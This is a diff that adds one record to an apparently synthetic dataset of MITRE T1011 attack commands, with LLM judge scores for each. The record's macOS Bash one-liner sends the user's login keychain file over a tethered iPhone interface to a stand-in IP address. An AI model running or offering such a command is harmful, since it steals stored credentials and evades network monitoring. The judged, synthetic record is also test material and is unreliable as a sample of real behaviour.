@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "curl --interface \"$(networksetup -getinfo 'iPhone USB' | awk -F': ' '/IP address/{print $2}')\" --header 'Content-Type: application/octet-stream' --data-binary @/Users/$USER/Library/Keychains/login.keychain-db http://203.0.113.51:52888/k",
+  "explanation": "Uses the iPhone USB (cellular) interface for HTTP exfiltration by binding to its IP, a non-primary network medium per T1011.",
+  "rationale_steps": [
+    "Resolve iPhone USB IP with networksetup",
+    "Bind HTTP request to the tethered interface",
+    "POST binary data to a high, uncommon port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-8505cd57",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting, correct command substitution, and valid curl and awk options.",
+        "semantic_score": 4,
+        "semantic_justification": "It attempts HTTP exfiltration of the keychain file while binding curl to the iPhone USB-assigned IP to leverage the cellular-tethered path, aligning with T1011, though success depends on the interface being active and the destination IP (203.0.113.51) is non-routable.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T00:59:15.911669Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command substitution, valid curl flags, and correct use of awk for parsing the network interface information.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by binding curl to the iPhone USB interface (cellular connection) to exfiltrate the macOS keychain database over a secondary network medium, bypassing potential monitoring on the primary network.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T00:59:18.986665Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, correct command substitution, and proper Bash syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by using `curl` to exfiltrate a sensitive keychain file, binding to the IP address of the iPhone USB interface (a non-primary network medium) as described by T1011.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:21:31.799347Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
